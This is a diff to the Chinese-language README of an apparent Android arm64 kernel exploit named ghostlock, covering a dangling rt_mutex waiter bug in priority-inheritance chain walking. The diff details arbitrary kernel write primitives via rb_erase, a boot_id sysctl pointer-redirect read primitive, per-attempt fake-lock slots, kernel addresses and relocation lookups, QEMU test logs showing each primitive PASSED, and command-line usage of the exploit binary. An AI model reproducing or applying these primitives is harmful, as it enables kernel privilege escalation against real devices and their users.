@@ -89,25 +89,60 @@ KASLR slide=0x147f200000    runtime _stext=0xffffff9487280800
 ### 写原语与投递链（QEMU 端到端验证，无注入）
 
 `rt_mutex_adjust_prio_chain` 的 walk 读悬空 `pi_blocked_on` 处的 fake rt_waiter：
-- [3] `next_lock == waiter->lock`（`lock = empty_zero_page`，固定 .bss，ownerless）
+- [3] `next_lock == waiter->lock`（`lock` = `empty_zero_page` 的独立槽位，见下）
 - [5] `raw_spin_trylock(&lock->wait_lock)` 零锁成功
 - [7] `rt_mutex_dequeue` → `rb_erase` 单左子路径：`*(rb_left) = rb_parent_color`
   → 写值 `0xffffff800b412320`（&loggers[0][1]）写入 `sysctl_bootid + 8`
 - [9] ownerless 干净返回
 
-**不需要 owner-ful 页 / `prepare_skb_payload` / `kernelsnitch`**——`empty_zero_page`
-（固定 .bss 地址 0xffffff800b750000）即可作 `lock`。
+**不需要 owner-ful 页 / `prepare_skb_payload` / `kernelsnitch`**。fake `rt_mutex`
+**不能跨 walk 复用同一个槽**：walk 结束会把 `waiters.root/leftmost` 留在锁里指向
+本次 waiter，第二次 walk 读到旧节点就会解引用上一轮已释放的内核栈，触发
+`rt_mutex_top_waiter()` 的 `BUG_ON(w->lock != lock)`（QEMU 实测：`--verify-all`
+的第二个测试直接 BUG）。实现上每次 attempt 取 `empty_zero_page + n*0x20`
+（共 128 个槽，`SLIDE_LOCK_STRIDE/SLOTS`），天然全零且互不污染。
 
-QEMU（`kernel.patched`，nokaslr，`--probe-cycle`）工具自验证输出：
+QEMU（`kernel.patched`，nokaslr，`--probe-cycle --verify-all`）工具自验证输出：
 
 ```text
-slide boot_id raw=00000000000000002023410b80ffffff lo=0 hi=ffffff800b412320 expected_hi=ffffff800b412320 write_ok=1
-slide attempt 1 ok=1 value=ffffff800b412320 target=ffffff800b7f8b6c requeue=-1/35 trigger=0/0 wait=-1/110 carrier=-1/22
-slide write test PASSED
+4.483 237 [+] slide write boot_id raw=00000000000000002023410b80ffffff lo=0 hi=ffffff800b412320 exp_lo=0 exp_hi=ffffff800b412320 ok=1
+4.547 1   [+] slide write test PASSED
+6.583 240 [+] slide leaf boot_id raw=00000000000000002023410b80ffffff lo=0 hi=ffffff800b412320 exp_lo=0 exp_hi=0 ok=1
+6.636 1   [+] slide leaf test PASSED
+8.671 243 [+] slide read boot_id raw=100000002401000030d74c0b80ffffff lo=0000012400000010 hi=ffffff800b4cd730 exp_lo=0000012400000010 exp_hi=ffffff800b4cd730 ok=1
+8.724 1   [+] slide read test PASSED
+10.811 1  [+] slide restore test PASSED
+10.811 1  [+] slide verify all PASSED
 ```
+
+（每次 attempt 的 `requeue=-1/35 trigger=0/0 wait=-1/110 carrier=-1/22` 一致：
+EDEADLK、walk 成功、hrtimer 超时、载体拷贝成功后才因假地址组返回 EINVAL。）
 
 注意验证目标写 `boot_id + 8`：`proc_do_uuid()` 在 `bootid[8] == 0` 时会重新生成
 整个 UUID，写低 8 字节会被验证读本身覆盖（QEMU 实测确认）。
+
+### 写原语形状（`--verify-all` 全覆盖自检）
+
+| 形状 | fake waiter tree 三词 | 效果 |
+|---|---|---|
+| pointer（rb_erase Case 2：单左子） | `pc=value, right=0, left=target` | `*(target) = value`（64 位全量，颜色位保留）；副作用 `*(value+8) = target`，因此 `value` 必须可读且其 +8 可牺牲 |
+| leaf（Case 1：无子） | `pc=target-8, right=0, left=0` | `*(target) = 0`；只有一次干净写（无副作用），`pc` 低位=0 → RED → 不触发 rebalance，但 `__rb_change_child` 会读一次 `*(target-8)` |
+
+### 读原语（移植自 mrx-w09 的 boot_id 通道）
+
+`random_table[4].data`（= `&sysctl_bootid`，link `0xffffff800b4cd730`；由
+`.rela.dyn` 里唯一一条 addend=`0xffffff800b7f8b64` 的 R_AARCH64_RELATIVE 确认）
+被写原语改成目标地址 A 后，读 `/proc/sys/kernel/random/boot_id` 即返回
+`[A, A+16)`。注意：
+
+- `proc_do_uuid()` 在 `((u8 *)A)[8] == 0` 时会重新生成 16 字节 UUID（并改写 A），
+  被读窗口 byte 8 必须非零；
+- 指针写的副作用会写 `A+8` = `.data` 槽地址，所以读回高半区恒为该槽地址；
+  需要精确读 16 字节时应避开这一位置。
+
+`--verify-read` 自检：把 `.data` 指向 boot_id ctl_table 条目 +0x10（`maxlen=16,
+mode=0444` → 常量 `0x0000012400000010`）读回，再用 `restore` 步骤指回
+`sysctl_bootid`。
 
 历史验证（均已注入，仅存档）：QEMU GDB 直写悬空 blk；实机 KPM 重建 overlay。
 
@@ -185,9 +220,14 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 # 写原语端到端自检：EDEADLK -> MCAST 载体 -> sched_setattr -> boot_id 校验
 ./ghostlock_exe --verify-write
 
+# 全量自检：指针写 + leaf 零写 + 读原语 + 恢复（QEMU 器具用这个）
+./ghostlock_exe --verify-all
+./ghostlock_exe --verify-leaf          # *(bootid+0) := 0
+./ghostlock_exe --verify-read          # boot_id .data 指针重定向 -> 读回
+
 # 示例组合
 ./ghostlock_exe --verify-write --attempts 5 --no-rt --hold
-./ghostlock_exe --verify-write --probe-cycle \
+./ghostlock_exe --verify-all --probe-cycle \
                 --kaslr-base 0xffffff8008080800 \
                 --log-file /data/local/tmp/gl.log      # QEMU/nokaslr
 ```
@@ -195,7 +235,8 @@ make                      # NDK r29 / host clang；LOGCAT=1（logcat）默认
 参数：`--kaslr-base ADDR`、`--log-file PATH`、`--attempts N`、
 `--wait-seconds N`、`--requeue-ms N`、`--no-rt`、`--rt-prio N`、
 `--probe-cycle`（kernel.patched/QEMU 必需）、`--noconsume`、`--hold`、
-`--detach`、`--fsync`。**环境变量已全部移除**（含旧 `GOT_*` 实验开关）。
+`--detach`、`--fsync`、`--verify-write`、`--verify-leaf`、`--verify-read`、
+`--verify-all`。**环境变量已全部移除**（含旧 `GOT_*` 实验开关）。
 
 QEMU 以本程序做 /init 时注意：内核没有控制台，fd 0/1/2 可能未打开，
 需在 wrapper 里先补上可用 fd（否则 `pipe()` 会占用 fd 0/1，子进程的
